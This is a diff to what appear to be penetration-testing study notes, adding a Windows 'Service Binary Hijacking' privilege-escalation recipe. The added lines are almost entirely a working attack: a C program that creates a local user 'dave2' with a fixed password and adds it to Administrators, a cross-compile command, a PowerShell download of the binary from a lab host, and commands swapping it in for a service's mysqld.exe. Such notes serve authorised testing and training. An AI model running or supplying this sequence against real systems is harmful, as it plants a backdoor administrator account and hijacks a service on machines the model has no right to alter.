@@ -68,6 +68,22 @@ It is more likely that the software's main directory (C:\Program Files\My Progra
 ###### Service Binary Hijacking
 ```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+adduser.c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
 ```
 
 ### Linux
